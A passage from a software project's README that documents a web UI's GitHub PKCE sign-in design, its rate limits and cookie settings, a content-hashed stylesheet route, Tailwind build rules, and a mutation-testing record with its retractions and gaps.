LESSON.** The share flow shipped with `tests/ui_share_mutants.py` — 234 lines, a second copy of
`control_mutants.py`'s harness — and **no gate ran it**: `grep -l ui_share_mutants` over the whole
tree returned the file and one line of this README, while `control_mutants` is a step in
`.github/workflows/ci.yml` and is pinned by `tests/test_control_mutant_count_is_pinned.py`. It also
mutated the LIVE working tree where that harness mutates a `copytree`. Round 0 of #64's audit found
it. The eight rows moved into `control_mutants.py` (the `ui-` prefixed ones), `./internal/ui/`
joined its `PKGS`, and the file is deleted — so the rows now get the CI step, the isolation and the
count pin that the copy would have had to re-earn. **A second battery is a second thing to remember
to run.**

| row | killed by |
|---|---|
| `ui-audience-reads-grant-rows-instead-of-Resolve` | `TestTheAudienceIsComputedFromResolveNotFromGrantRows` |
| `ui-replica-notice-drops-a-clause` | `TestTheReplicaHonestyNoticeIsPinnedWhole` |
| `ui-verbs-read-single-value` | `TestEveryTickedVerbReachesTheGrant` |
| `ui-share-subject-accepted-from-the-form` | `TestTheSubjectIsValidatedAgainstCandidates…` |
| `ui-unshare-skips-the-objects-authority-check` | `TestARevokeIsAuthorisedFromTheGrantRatherThanFromTheForm` |
| `ui-share-page-skips-its-authority-check` | `TestTheSharePageRefusesAScopeThisCallerCannotAdminister` |
| `ui-page-never-reports-a-read-only-authority` | `TestAReadOnlyDeploymentSaysSoOnThePage…` |
| `ui-share-write-authority-check-removed-in-the-handler` | `TestTheSharePageRefusesAScopeThisCallerCannotAdminister` (its no-verb arm) |

🔴 **THAT LAST ROW WAS LABELLED `EQUIVALENT` AND THE LABEL WAS MEASURED FALSE — the
retracted argument is kept here because an EQUIVALENT label is exactly what stops anybody
writing the test that kills the mutant.** It read: *"Removing either alone is observably
equivalent: the other still answers 403 with the same body … Both sites call the same
predicate, so this is one rule at two call sites, not two rules."*

The discriminator it missed is a request with **no `verb` field**. The handler's
`Allows(scope, VerbAdmin)` runs BEFORE the form is validated, so:

| tree | status |
|---|---|
| unmutated | **403** — refused on authority, disclosing nothing about the input |
| the handler's check removed | **400** — the caller reaches verb validation and learns their input was the problem |

So the two sites are **not** redundant, and the row is an ordinary killable one.
`TestTheSharePageRefusesAScopeThisCallerCannotAdminister` carries that exact case.

⚠ **AND THIS PARAGRAPH IS THE SECOND HALF OF THAT RETRACTION, WRITTEN A ROUND LATE.** The
round that retracted the label did it in `tests/control_mutants.py` and
`internal/control/README.md` and left this file arguing the refuted case — under a 🔴, in
the first place a reader of `internal/ui` looks, telling them a check the same round had
just proved load-bearing was redundant. Its own commit message said *"a retraction is a
TREE-WIDE SWEEP, not an edit at the site you happened to be reading"*. Four retractions in
that commit were swept at one site each.

⚠ **The split is not restated here.** `internal/control/README.md` carries the battery's
`mutants / killed / EQUIVALENT` line and is the only place pinned to it; a second copy here is the
count that goes stale.

## What Phase C's tests still cannot see

Everything Phase A's and Phase B's lists say still applies, plus:

- 🔴 **NO TEST DRIVES TWO ACTORS AT THE SAME INSTANT.** Two admins sharing and revoking one scope
  concurrently is argued from `control.FileStore.Append`'s own locking and is not measured here.
  `go test -race` is clean over the package; that is a different claim.
- **The audience is not measured at scale.** Its cost is O(principals × grants log grants) per page
  and the largest fixture holds three users. Nothing here would notice it becoming slow.
- **`Candidates` is measured over one shape of membership** — two users in one common project.
  Nested or overlapping memberships beyond that are untested.
- 🔴 **A GRANT WHOSE OBJECT IS A PROJECT IS VISIBLE AND NOT REVOCABLE HERE**, deliberately: revoking
  it from a page about one scope would silently withdraw every other scope that project owns. There
  is no project page, so today there is **nowhere in this surface** to revoke one. Stated as a gap
  rather than left for somebody to find by hunting for a button.
- 🔴 **THIS BULLET IS RETRACTED, AND THE RETRACTION IS THE ENTRY.** It read: *"Nothing measures a
  real deployment. `packages.ui-image` now BUILDS an image — and a build is not a deploy: nothing
  publishes it and there is still no manifest, so `-control-journal` has been exercised by tests and
  by nothing else."* **All three clauses are now false.** The image is PUBLISHED, a manifest deploys
  it from the operator's GitOps repository (not this one — which is why "there is still no manifest"
  was never a measurement of anything), and the surface is LIVE and public, serving a cookie session
  against a real store. What survives as a genuine gap is narrower and is worth keeping separately:
  **no test in this repository drives the deployed instance**, so every guard here is a claim about
  the code and none is a claim about what is running. The distance between those two is what
  `AGENTS.md`'s "deployed ≠ verified" rule is about.

# Phase D — GitHub sign-in through the operator's Supabase/GoTrue

The sign-in page grows a **second door**. The credential form is unchanged and is not
optional; what is new is a `Sign in with GitHub` button, an authorization-code flow with
PKCE, and two rows in the ledger.

## 🔴 The credential form SURVIVES, and that is a requirement rather than a courtesy

Three independent reasons, and any one of them is enough:

- **It is the door that verified this deployment.** The surface went live and served its scopes
  to a cookie session minted by pasting a credential token into `[name=token]`.
- **It is the only door that works when the identity provider is down.** The JWKS is cached
  and an already-issued session survives an outage — `SupabaseJWT`'s own comment measures
  that — but a *new* sign-in through the provider does not.
- **A browser evaluation harness drives it, and cannot drive OAuth.** The provider flow is
  cross-origin to a third party with MFA, so nothing automated completes it. The alternative
  — a test-only authentication bypass — is exactly what `identity.SessionCookie`'s comment
  argues against: *"an env var to turn it off for local development is a variable that ends up
  set in production."*

`TestTheCredentialFormSURVIVESTheProviderButton` pins the **selector**, not the word: exactly
one field named `token`, a `password` input, a form posting to `SignInPath` — on a deployment
with a provider and on one without — and then it drives a real credential through to a 303 plus
a session cookie.

## 🔴 PKCE with a server-side exchange, and NO `state` parameter

The flow is: `POST /sign-in/github` → 303 to GoTrue's `/authorize` carrying
`code_challenge` + `code_challenge_method=s256` + `flow_type=pkce` → the provider redirects to
`GET /sign-in/github/callback?code=…` → this process POSTs `/token?grant_type=pkce` with the
code and the verifier → the returned access token is **verified through
`identity.SupabaseJWT`** → the SAME cookie session the token form mints.

Two decisions inside that are worth reading twice.

**`flow_type=pkce` is what keeps the flow scriptless.** Without it GoTrue returns the access
token in the URL **fragment**, which no server ever receives: the page would need script to
read `location.hash` and post it back. That is more code, a second way in, and a token in the
browser's history. A draft of this change carried `script-src 'self'`, which would have
permitted such a script — the flow was available and was refused.

⚠ **THAT PARAGRAPH'S SECOND HALF IS RETIRED, AND THE DECISION IT DESCRIBES IS NOT.** It read
*"That clause is gone too: having deliberately built the flow scriptless, keeping a directive
that re-permits script 'for later' would be the policy-wider-than-the-code shape this surface
refuses."* There is no policy left to be wider than the code — the whole header was deleted by
operator decision, so **nothing in a browser forbids script here any more**. The scriptless flow
stands on the half that never depended on a header: a token in the fragment is a token in the
browser's history that the server never receives, and a flow needing script to complete is a
second way in. `internal/identity/supabaseoauth.go` carries the same retraction beside the
`flow_type` parameter. Do not re-derive *"the CSP is gone, so the implicit flow is fine now"*.

**There is no `state` parameter, and its absence is a decision with a reason.** GoTrue does not
pass an arbitrary `state` through to the callback; it manages its own and appends only `code`.
Carrying one would mean smuggling it into the redirect URL's query, which changes the string the
operator's `GOTRUE_URI_ALLOW_LIST` has to match. What `state` buys is a binding between the
callback and the browser that started the flow, and that binding is supplied instead by the
**flight cookie** plus the **PKCE verifier behind it**:

> An attacker who obtains a code of their own and makes a victim's browser open the callback
> loses twice. With no flight cookie there is nothing to exchange with. With the victim's OWN
> flight cookie, the exchange presents the VICTIM's verifier against the ATTACKER's code, which
> the token endpoint refuses.

`TestAFlightIsSingleUseAndBoundToItsBrowser` drives all three arms of that — a replay, a
callback with no cookie, and a planted flight id — and asserts the provider was reached
**once** in total, because a refusal that still costs a network round trip is one anybody can
make this process perform.

## 🔴 Where the PKCE verifier lives, and why it is NOT the durable session store

`internal/ui`'s `flights` table: in memory, keyed by a 32-byte flight id carried in a
`__Host-cairn-oauth` cookie (`HttpOnly`, `Secure`, `SameSite=Lax`, `MaxAge` = the flight TTL),
**single use** (the record is MARKED consumed on read, never deleted — see below), **expiring**
(5 minutes), and **bounded twice**
(`maxFlightsPerClient` = 8, `maxOpenFlights` = 1024).

- **Why not the session store.** `identity/session.go` rejects in-memory storage *for
  sessions* because a restart signs everybody out and a second replica has no shared truth.
  Neither cost lands on a flight: a restart mid-flight costs ONE person ONE retry of a button
  they are looking at. And the durable store would be **worse** — it would write a live PKCE
  verifier to disk, where the whole reason the session table holds `sha256(id)` rather than the
  id is that a file of live credentials is a file worth stealing.
- **Why not the cookie alone.** Carrying the verifier in the browser's own `HttpOnly` cookie
  needs no table at all, and it was refused on ONE property: single use. A cookie is deleted by
  *asking* the browser to delete it, so a client that declines cannot be made to; a map entry
  MARKED consumed by the server cannot be presented twice whatever the client does. ⚠ This bullet
  said "a map entry **removed** on read", which was the mechanism for exactly one commit: deleting
  freed the caller's rate slot at the start of the token exchange. The argument never rested on
  the delete — it rests on the decision being the server's.
- **Why there are TWO caps, and why one is not enough.** `POST /sign-in/github` is reachable by
  anybody who can open a socket, and every request writes a record that lives five minutes.
  Without `maxOpenFlights` the route is a memory-exhaustion endpoint. But a **global cap alone
  is a denial of service with extra steps**: one anonymous caller reaches 1024 on its own,
  refreshed every five minutes, and everybody else's button then refuses until the oldest
  expire. `maxFlightsPerClient` is what stops one caller spending everybody else's share —
  `netid`'s own comment makes the same ruling about a limiter with one bucket. Because a spent
  record holds its slot until expiry, **both** numbers bound a RATE: `maxOpenFlights` bounds total
  sign-in starts across all clients per `FlightTTL`, and `maxFlightsPerClient` bounds one
  caller's.
  ⚠ The residual cost: callers behind a shared egress address share a client identity, so a busy
  office reaches 8 between them. That delays a GitHub sign-in and never a credential one — the
  token form touches this table not at all.
- **The existing sign-in lockout covers this door, and `RecordFailure` deliberately does not.**
  `handleOAuthStart` consults `netid.RateLimiter.LockedOut` (its absence was a real hole: a
  client locked out for five failed credential attempts could still drive the start row without
  limit). It does **not** record a failure, because that bucket is shared with `POST /sign-in` at
  5 per window — so counting a *started* sign-in there would mean five clicks of this button lock
  the caller out of the **credential form** for fifteen minutes, behind a refusal that explains
  nothing. Starting a sign-in is not a failing one; the rate of flight creation is bounded by the
  table that holds the flights. `TestALockedOutClientOpensNoFlight` pins both halves, including
  the absence.
- ⚠ **`SameSite=Lax` is load-bearing here, not a convenience.** The callback is a top-level GET
  navigation from the PROVIDER's origin, which is cross-site: `Strict` would withhold the cookie
  and every provider sign-in would be refused.

## 🔴 The callback is the ONE state-changing handler behind a safe method

`stateChanging` calls `GET` safe, so **neither cross-site gate covers the callback** — and it
cannot be a POST, because the provider chooses the method and a redirect is a GET. What covers
it is the flight, as above. The **start** row is a POST for the mirror reason: as a GET it would
be reachable by any `<img src>` in the world and by every link prefetcher, each of which would
mint a flight and overwrite the visitor's flight cookie. So the button is a form, not a link,
and `TestTheStartRowIsRefusedCrossSite` pins that gate (2) covers it and that a refused request
opens **zero** flights.

## Configuration, and the three states a deployment can be in

🔴 **TWO NAMESPACES, AND THE SPLIT IS LEGIBLE RATHER THAN HISTORICAL.** The verifier's
settings are **`CAIRN_OIDC_*`** (`JWKS_URL`, `ISSUER`, `AUDIENCE`, `PROVIDER`,
`REQUIRE_ROLE`, `LEEWAY`, `MAX_AGE`) because the verifier is a generic RFC 7519/JWKS one and
a vendor prefix asserted a dependency it never had; their `CAIRN_SUPABASE_*` spellings still
resolve through `internal/envalias`, the new name wins, and a deprecated one that is set
warns once. They are read through `identity.SupabaseBackendFromEnvironment`, which is the
**same ledger and the same blank policy** `cmd/cairn-server` gets — a second reader of that
ledger is the duplicated predicate `internal/identity/config.go`'s whole history is about.
The operator contract for pointing it at any IdP is `internal/identity/README.md`
§ *Wiring any OIDC provider*.

**One** name stays in the `CAIRN_SUPABASE_*` namespace and is read by `cmd/cairn-ui` itself,
outside the ledger, and the cost is stated where it is declared:
`CAIRN_SUPABASE_REDIRECT_URL` (required; what arms the button, judged with
`identity.ValueReducesToNothing` rather than a fresh `TrimSpace`). ⚠ **IT IS NOT RENAMED,
AND THAT IS THE DECISION RATHER THAN AN OVERSIGHT**: this one really does talk to GoTrue —
its `/authorize`, its `/token`, its `GOTRUE_URI_ALLOW_LIST` — so the vendor prefix is the
informative part. `cmd/cairn-ui`'s `TestTheOAuthSettingIsInTheSupabaseNamespaceAndItsPathsComeFromTheLedger`
pins that it stays there.

⚠ **A `CAIRN_SUPABASE_ANON_KEY`/`_FILE` PAIR WAS DRAFTED AND DELETED**, and the record is worth
more than the code was. A **hosted** Supabase project sits behind an API gateway that refuses the
token endpoint without an `apikey` header; this deployment runs GoTrue **self-hosted** behind its
own ingress, has no such gateway, and declined the variable in its own manifest. So the pair
carried a both-set refusal, a file reader, a trailing-newline ruling and two tests for a
deployment shape nobody has — and the `_FILE` spelling would have been the **first secret this
pod mounts**. Re-adding twenty lines if a hosted project ever appears is cheaper than carrying
them; the symptom that would call for it (the exchange answering 401 with everything else
correct) is recorded at `identity.SupabaseOAuth.Exchange`.

🔴 **There is no `CAIRN_SUPABASE_AUTH_URL` and never was one.** `/authorize` and `/token` hang off the verifier's
own **issuer**, which for Supabase *is* the GoTrue base URL. Two places to name the project is a
deployment that verifies tokens from one and starts sign-ins at another — every sign-in would
complete at the provider and be refused here, with nothing naming the disagreement.

| state | what it means | what the surface does |
|---|---|---|
| no verifier variable in either spelling | the deployment that existed before this change | credential form only; the two OAuth rows answer **501** |
| the ledger armed, no redirect URL | a bearer JWT authenticates; no browser flow | credential form only; rows answer 501; the startup line says so |
| both, key set fetched | the button is live | both doors |
| both, key set **never fetched** | the provider was unreachable at startup, or is now | credential form only; rows answer **503**; a `WARNING` on stderr; **re-arms by itself** when a fetch succeeds |
| a redirect URL and no verifier | half-configured | **refuses to start**, naming the variable that unblocks it |
| a redirect URL whose path does not end with the callback route | a typo, or a line copied from another app | **refuses to start**, naming both paths |
| a redirect URL that does not parse | a broken template substitution | **refuses to start** |

⚠ **This table listed FOUR rows and stopped at the third state**, with no 503 row and no
path-mismatch row — both of which the same change introduced. The startup line reports which
state it is in, for the reason it already reports whether a share can be recorded: the answer is
decided at startup and discovered at the first click otherwise.

## The stylesheet is TWO routes, and its bytes are BUILD OUTPUT

All three pages link **`/static/app.<12 hex>.css`** — a path carrying a digest of the bytes it
serves — and `handleHashedStylesheet` answers it. The unversioned `/static/app.css` is still a
row, answered by `handleStylesheet`, and **nothing links it**. Both are `classPublic` because
the sign-in page links the hashed one and that page answers anybody — a stylesheet behind the
chain renders the way in as unstyled text. Both serve an **embedded file**, not a directory: an
`http.FileServer` would need a prefix match, which is a second way for a request to reach a
handler and one `TestEveryServedPathComesFromTheLedger` structurally cannot probe.
`TestTheStylesheetIsServedAsItsOwnRoute` pins the RELATIONSHIP rather than either side — it
reads each page's `<link href>` and then fetches that exact href, because two separate
assertions would both pass for a route nobody links or a link nobody serves.

⚠ **THE ROUTE'S ORIGINAL REASON IS GONE AND THE ROUTE IS NOT.** It existed because
`style-src 'self'` forbade an inline `<style>`; that policy was deleted (see *Response
hardening* above), so an inline stylesheet would work again. What keeps the route is the
size: the bytes are generated now, ~29 KB, and inlining them would send that on every
response instead of once per cache lifetime.

### The content-hashed path, and why an unversioned one could not be fixed with a header

🔴 **A CACHE IS KEYED ON THE URL, SO AN UNVERSIONED URL IS AN ENTRY NOTHING CAN INVALIDATE.**
The surface shipped with one stylesheet row at the constant `/static/app.css` and
`Cache-Control: public, max-age=300`, and the short `max-age` was chosen precisely because the
URL carried no version. It was not enough. After an image bump the origin served the current
stylesheet while a returning browser went on applying a much smaller predecessor — one rule for
the sign-in page's classes where the current theme has dozens. The page rendered **unstyled**,
with no error, no missing entry and nothing red anywhere.

🔴 **AND THE HEADER WAS NOT THE LEVER.** The edge in front of the origin answered
`max-age=14400` where the origin asked for `max-age=300` — 48× — so the stale window was hours.
A `Cache-Control` is a *request* to every cache in the path and an intermediary may lengthen it.
That is why the fix is the URL: a URL derived from the bytes is one the browser has never seen
after a theme change, so there is nothing for any cache to serve stale and no cache has to
cooperate.

| piece | where |
|---|---|
| `hashStylesheet` / `hashedStylesheetPathFor` | `stylesheet.go` — SHA-256 of the embedded bytes, hex, first **12** characters |
| `StylesheetHashedPath` | `routes.go`, a **`var`** derived at package init; writing its value down anywhere is the defect coming back under a longer name |
| the two `Cache-Control` values | `server.go` — `public, max-age=31536000, immutable` on the hashed row, `public, max-age=300` on the unversioned one |

🔴 **`immutable` IS LICENSED BY THE URL, NOT BY THE BYTES BEING STABLE.** It tells a cache never
to revalidate for a year, which is only ever true of a URL that cannot come to mean different
bytes. The hashed row has that property by construction; the unversioned row does not and keeps
the short value, which
`TestTheStylesheetRowsCarryTheCacheHeadersTheirURLsLicense` pins in **both** directions as whole
strings — including that the unversioned row's value does not *contain* `immutable`.

🔴 **THE UNVERSIONED ROW IS KEPT, AND THE CONDITION IT IS KEPT UNDER IS THAT NOTHING LINKS IT.**
It costs one ledger row and it means URLs already loose in the world — an HTML page a browser
rendered before the deploy, a bookmark, a link out of a log — answer the current bytes instead
of 404. That argument holds only while the set of such URLs is CLOSED. A page that linked it
would issue every visitor an unversioned URL again and reinstate the whole failure with the
hashed row sitting beside it doing nothing, and it would be silent: every page renders, every
style applies on a cold cache. `TestNoPageLinksTheUnversionedStylesheetPath` is the guard, and
it validates its own detector against a body that must match before reporting a clean verdict.

⚠ **A COMPUTED KEY IS STILL AN EXACT KEY, WHICH IS THE WHOLE REASON THIS WAS ALLOWED.** `routes`
refuses a prefix match — see `routes.go` on why the share flow puts its scope in a query
parameter — because a prefix is a second way to reach a handler and leaves no finite set of
paths to probe. A key computed at init is none of that: the served set is still finite, still
enumerable, still exactly the map's keys, and `TestEveryServedPathComesFromTheLedger` probes
this row's near-misses (`/static/app..css`, a wrong digest, a suffixed digest) and requires 404
from each.

⚠ **WHAT THE LEDGER GUARD STILL CATCHES, AND WHAT IT NO LONGER DOES.**
`TestTheRouteLedgerMatchesTheDispatchTable`'s hand-written list substitutes a digest the *test*
computes from the embedded bytes into the hashed row, because a literal would make every theme
change a failing test with a hand-edit for a remedy. It still fails on a row ADDED, a row
REMOVED, a CLASS changed, a METHOD changed, the two ledger views drifting, and a hashed path
that is not the digest of the served stylesheet. It no longer pins the literal current digest —
which is the property being bought, not a gap. It also cannot see a change made to both the
digest derivation and the test's copy of it in one commit.

### The theme: Tailwind, compiled, checked in

| file | what |
|---|---|
| `internal/ui/tailwind.css` | the SOURCE — `@theme` tokens, the component layer, the reduced-motion block |
| `internal/ui/app.css` | the OUTPUT — generated, checked in, `//go:embed`ed by `stylesheet.go` |
| `nix run .#build-ui-stylesheet` | regenerates the output from the source, in the working tree |
| `checks.ui-stylesheet-is-current` | regenerates in a sandbox and REFUSES a difference |

🔴 **REGENERATE AND DIFF, NEVER HAND-EDIT `app.css`** — the same discipline
`internal/report/testdata/reader_fixtures.json` carries, and for a sharper reason: the file is
embedded, so a stale one is not a weaker comparison, it is *the theme the surface actually
serves*. Nothing about forgetting to regenerate is loud on its own — the build succeeds, every
Go test passes, and the previous stylesheet ships. The check is what makes it loud, and it
validates its own instrument first: a negative control appends a line to the generated bytes
and requires `diff` to report a difference, exiting **2** ("could not vouch") if the control
compares equal.

🔴 **NOTHING IS SCANNED. `tailwind.css` IS THE GENERATOR'S ONLY INPUT, AND THAT IS WHAT MAKES
A RAW UTILITY IN `render.go` A SILENT DEFECT.** The file declares
`@import "tailwindcss" source(none)` and **no `@source` at all**, so the output is a pure
function of those bytes plus the pinned CLI. The structural tell is in the artefact: `app.css`
carries a bare `@layer utilities;` — the layer is declared and **empty**.

🔴 **SO THE RULE THAT BINDS THE NEXT EDIT: EVERY CLASS `render.go` RENDERS IS A SEMANTIC NAME
DEFINED IN `tailwind.css`. NEVER A RAW TAILWIND UTILITY.** Add `h.Class("flex gap-2")` to a new
element and regenerate: `app.css` is **byte-unchanged**, so
`checks.ui-stylesheet-is-current` stays **green** and the element would ship with two class
names the served bytes have no rule for. Give it a named class here instead, composed with
`@apply` like the other ~35.

🔴 **`TestEveryRenderedClassHasARuleInTheStylesheet` IS WHAT MAKES THAT LOUD, AND IF YOU ARE
READING THIS BECAUSE IT WENT RED, IT IS RIGHT AND THE CODE IS WRONG.** Define the class in
`tailwind.css` and regenerate; do not delete the test. **Before it existed,
`go test ./internal/ui/` was green on exactly the defect above** — that is why it exists, and
it is the only thing in the tree that can see it: the currency check compares generated
against committed and a raw utility moves neither. It reads `Class(…)`, `Attr("class", …)` and
`Classes{…}`; a fourth way of emitting a class would be invisible to it, which its own doc
comment states.

⚠ **THIS SECTION USED TO TEACH THE OPPOSITE, AND THE RETRACTION IS THE POINT BECAUSE THIS
README IS THE DOC A NEXT EDITOR READS INSTEAD OF THE SOURCE COMMENTS.** It read *"THE CLASS
NAMES IN `render.go` ARE WHAT THE GENERATOR SCANS, SO EVERY ONE IS A LITERAL. `tailwind.css`
declares `@import "tailwindcss" source(none)` plus `@source "./*.go"`, which pins the scan to
exactly `internal/ui/*.go` … a class assembled at run time (`"text-" + size`) is invisible to
that scan"*, and it closed with *"Utilities are used directly for page layout."* Both were true
of the draft and both are now false: **the `@source` line was deleted**, because Tailwind's
extractor reads COMMENTS as readily as code and this package's comments are dense by house rule
— six utilities were generated out of ordinary English with no class literal anywhere, and a
comment-only edit reddened the currency check with a message blaming a hand-edit that never
happened. The measurement is in `tailwind.css`'s own header. The run-time-assembly hazard the
old text named is now the *whole* hazard rather than an edge of it: with no scan, a **literal**
utility is just as invisible as a computed one.

The semantic class names (`.viewer`, `.signin`, `.replica-honesty`, `.entry`, `.page-header`,
`.page-main`, `.signin-main`, …) are therefore the only kind this surface renders — the page
shell included, which is what the three `.page-*`/`.signin-main` classes are. Two are asserted
by tests here, one is driven by a browser harness outside this repository, and `@apply` in a
component layer is Tailwind's documented answer for exactly that.

🔴 **`prefers-reduced-motion: reduce` REMOVES THE MOTION, IT DOES NOT SHORTEN IT.** The common
snippet sets `animation-duration: 0.01ms`, which still *runs* the animation — a reader who
asked for no motion gets one frame of the same transform. The block sets `animation: none` and
`transition: none`, unlayered and `!important`, so it beats both the component layer and any
utility. It is a global block rather than per-call-site `motion-reduce:` variants for the
reason a spelled guard is weaker than a structural one: a variant is one forgotten class away
from being wrong, at a place where being wrong is an accessibility failure. Every keyframe set
uses `both` fill with a visible `to` state, so removing the animation leaves the element in its
ordinary static rendering rather than invisible at `opacity: 0`.

## The mutation rows — 31 mutants, 31 killed, and the battery is NOT in the tree

🔴 **READ THIS BEFORE THE TABLE: THIS BATTERY IS RUN BY HAND AND IS NOT COMMITTED.** Unlike
`tests/control_mutants.py` — a step in `.github/workflows/ci.yml`, pinned by
`tests/test_control_mutant_count_is_pinned.py` — the rows below were driven by a script in a
scratch directory, one mutant at a time, and nothing in this repository re-runs them. So this
table is a RECORD of a measurement, not a gate, and it is the only place in the tree that
records it: a later reviewer could not verify the count from the tree at all while the table
said 18 and the run was 27.
🔴 **A ROW HERE IS NOT COVERAGE. The guard it names is the coverage; the row is evidence the
guard was watched going red once.** If you change any of this code, the honest move is to
re-derive the relevant rows rather than to trust a table nothing re-runs — and the section above
records why a second committed battery was deleted rather than added.

Each row reverts ONE decision to its pre-change behaviour, or breaks one guard, and names the
test that must go red. A baseline ran first proving all 31 named tests GREEN, so a test that was
already red could not be reported as a kill; a mutant whose build failed was reported as
BUILD-FAIL and never as a kill.

| mutant | test that KILLED it |
|---|---|
| ~~the CSP reverted to the Phase A/B policy~~ — **RETIRED**: the policy it reverted no longer exists, and the test that killed it no longer asserts one. The replacement mutant is *the CSP header is restored*, killed by `TestTheHTMLResponseSendsNoContentSecurityPolicy`. Both rows are kept because a table row that silently changes meaning is worse than one that says it changed | `TestTheHTMLResponseSendsNoContentSecurityPolicy` |
| an undeclared path answers the old uniform 401 | `TestEveryServedPathComesFromTheLedger` |
| the root redirect deleted | `TestTheRootRedirectsABrowserAndRefusesEverythingElse` |
| the root redirect WIDENED to every client (`Accept` ignored) | the same test |
| the entries page inlines its stylesheet again | `TestTheStylesheetIsServedAsItsOwnRoute` |
| the ambient cookie tried before the Supabase header credential | `TestTheUIChainTriesEveryHeaderCREDENTIALBeforeTheAmBIENTCookie` |
| a flight is not consumed on read (replayable sign-in) | `TestAFlightIsSingleUseAndBoundToItsBrowser` |
| the flight table has no GLOBAL size bound | `TestTheFlightTableIsBoundedGloballyAndPerClient` |
| the PER-CLIENT flight bound is removed (one caller spends the whole table) | the same test |
| the start row ignores the sign-in lockout | `TestALockedOutClientOpensNoFlight` |
| a successful flight start RECORDS a failure against the shared sign-in bucket | the same test |
| the same-origin gate always passes | `TestTheStartRowIsRefusedCrossSite` |
| the exchanged token trusted because of the CHANNEL it arrived on | `TestTheExchangeVERIFIESWhatTheProviderReturned` |
| the PKCE challenge is the verifier itself (no S256) | `TestTheGitHubButtonMintsAFlightAndRedirectsToTheProvider` |
| a failed exchange discriminates its reason | `TestAFailedExchangeSaysNothingAboutTheCredentialTable` |
| the provider's `error_description` reflected into the page | `TestTheProviderErrorIsNotReflectedIntoThePage` |
| the credential field renamed, breaking the harness selector | `TestTheCredentialFormSURVIVESTheProviderButton` |
| the credential form rewired to post at the provider route | the same test |
| ~~`frame-ancestors` dropped (the surface becomes frameable)~~ — 🔴 **RETIRED, AND IT IS THE SHARPER OF THE TWO RETIREMENTS BECAUSE THE "MUTANT" IS NOW THE SHIPPED STATE.** The whole policy was deleted by operator decision, so this surface IS frameable — see *Response hardening* above. The row was false twice over: the named killer stopped asserting anything about the policy in the same change, and the state it calls a defect is the accepted one. **There is no replacement mutant**, deliberately: nothing here can kill a mutant whose result is what the tree already does, and inventing a row that sounded like coverage would be worse than saying so. What IS pinned is the deletion itself, by `TestTheHTMLResponseSendsNoContentSecurityPolicy` | *(nothing — see above)* |
| the chain assembled BY HAND in the wrong order — **the control that actually compiles** | `TestTheUIChainTriesEveryHeaderCREDENTIALBeforeTheAmBIENTCookie` |
| a spent flight DELETED again (the cap bounds concurrency, not rate) | `TestOneClientCannotAmplifyRequestsAtTheProvider` |
| the flight cookie loses its `__Host-` prefix | `TestTheFlightCookieCarriesItsPrefixAndFlagsOnTheWire` |
| `FlightTTL` widened to thirty days | `TestTheGitHubButtonMintsAFlightAndRedirectsToTheProvider` |
| the global flight cap **WIDENED** — the direction the old assertion could not see | `TestTheFlightTableIsBoundedGloballyAndPerClient` |
| the callback reads the query BEFORE consuming the flight | `TestTheProviderErrorIsNotReflectedIntoThePage` |
| an unready provider treated as ready | `TestTheProviderDoorIsWITHHELDWhileItsKeySetHasNeverBeenFetched` |
| the served stylesheet emptied (the self-referential comparison) | `TestTheStylesheetIsServedAsItsOwnRoute` |
| the pages link the UNVERSIONED stylesheet path again | `TestNoPageLinksTheUnversionedStylesheetPath`, and three others: `TestTheStylesheetIsServedAsItsOwnRoute`, `TestThePageLinksTheStylesheetByItsOwnDigest`, `TestTheStylesheetURLChangesWhenTheBytesChange` |
| the digest ignores the bytes it is given (a constant hashed instead) | `TestThePageLinksTheStylesheetByItsOwnDigest`, `TestTheStylesheetURLChangesWhenTheBytesChange`, `TestTheRouteLedgerMatchesTheDispatchTable`, `TestTheHashedStylesheetPathHasTheShapeItClaims` |
| the hashed row served without `immutable` | `TestTheStylesheetRowsCarryTheCacheHeadersTheirURLsLicense` |
| `StylesheetHashedPath` written down as a literal equal to today's digest — 🔴 **AN EQUIVALENT MUTANT ON THIS TREE AND SAYING SO IS THE POINT.** The two expressions evaluate to the same string *today*, so nothing can distinguish them until `app.css` changes; a table row claiming a kill here would be false. What IS measured: with the mutant applied **and** one byte appended to `app.css`, three guards go red — and the same byte change against unmutated code is green, so the red is the mutant's | `TestTheRouteLedgerMatchesTheDispatchTable`, `TestThePageLinksTheStylesheetByItsOwnDigest`, `TestTheHashedStylesheetPathHasTheShapeItClaims` — *only once the bytes move* |
| the startup callback-path check disabled | `TestTheProviderFlowDecisionTable` |
| that check made an EQUALITY again (refusing a path-prefixing proxy) | the same test |
| the flight cookie's `Path` no longer exactly `/` — a `__Host-` cookie a browser DROPS | `TestTheFlightCookieCarriesItsPrefixAndFlagsOnTheWire` |
| a consumed flight KEEPS its PKCE verifier in memory | `TestAFlightIsSingleUseAndBoundToItsBrowser` |

🔴 **ONE OF THOSE MUTANTS SURVIVED ITS FIRST RUN, AND THE SURVIVAL WAS A DEFECT IN THE TEST
RATHER THAN IN THE CODE.** The S256 assertion first read
`pkceChallenge(stub.verifiers[0]) == stub.challenges[0]` — both sides of a comparison derived
from the implementation under test. A mutant making `pkceChallenge` return its argument
**verbatim** (PKCE switched off, the verifier travelling in the authorize URL) passed that
spelling, because both sides moved together. The fix computes `base64url(sha256(verifier))`
independently in the test, and adds an assertion that the challenge and the verifier are not the
same string. That is the "never derive a test's expectation from the implementation it tests"
rule, caught by the battery rather than by review.

🔴 **AND A LATER ROUND RAN ITS OWN 21 MUTANTS AND FOUR SURVIVED — TWO OF THEM AGAINST GUARDS THE
ROUND ABOVE HAD JUST WRITTEN.** The survivors were: the startup callback-path check (no test fed
it a wrong path at all), the `__Host-` cookie's `Path` (asserted with
`strings.Contains(header, "Path=/")`, which `Path=/sign-in` satisfies), the "verifier is cleared
on consume" claim, and one magnitude-band mutant that was by design. All four are closed now.
**Read that as a measurement of the battery rather than of the code: a battery you choose is
blind to exactly what you did not think to mutate**, which is why the table above is evidence and
not coverage, and why an independent round is worth more than another row. The four rows at the
end of the table are the ones that close those survivors — they exist because somebody else
looked, not because the battery grew on its own.

## What Phase D's tests still structurally cannot see

- 🔴 **A GUARD THIS SECTION SHOULD HAVE PREDICTED AND DID NOT: the startup path check shipped
  with no test at all.** Mutating its condition to `false` survived all 27 tests in
  `cmd/cairn-ui`, because the only redirect URL any fixture fed it happened to have a matching
  path. A check whose guard is "the fixture happens to satisfy it" is a check nobody holds, and
  the decision table it belongs to says in its own docstring that it is "written out because it
  is a decision and not a derivation" — the new decision was simply not written into it. Every
  row of that table now carries the refusal it expects to see BY NAME, so a row cannot go green
  on the wrong refusal.
